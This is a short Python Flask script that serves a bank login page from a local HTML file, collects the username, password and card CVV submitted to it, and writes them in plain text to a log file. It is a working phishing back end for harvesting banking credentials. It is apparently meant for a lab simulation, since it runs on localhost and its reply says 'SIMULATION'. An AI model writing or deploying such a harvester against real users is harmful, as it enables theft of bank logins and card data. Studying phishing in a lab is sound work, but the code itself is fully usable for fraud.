from flask import Flask, request, render_template_string, redirect, url_for
import os
app = Flask(__name__)


with open("bank_login.html", "r", encoding="utf-8") as f:
    PAGE_HTML = f.read()

DATA_FILE = "login_data.txt"

@app.route("/", methods=["GET"])
def index():
    return render_template_string(PAGE_HTML)

@app.route("/submit", methods=["POST"])
def submit():

    username = request.form.get("username", "").strip()
    password = request.form.get("password", "").strip()
    cvv = request.form.get("cvv", "").strip()

    with open(DATA_FILE, "a", encoding="utf-8") as f:
        f.write(f"username: {username} | password: {password} | cvv: {cvv}\n")


    return "<h3>Submitted (SIMULATION). Thank you — return to lab.</h3>"

if __name__ == "__main__":

    app.run(host="127.0.0.1", port=8080, debug=False)
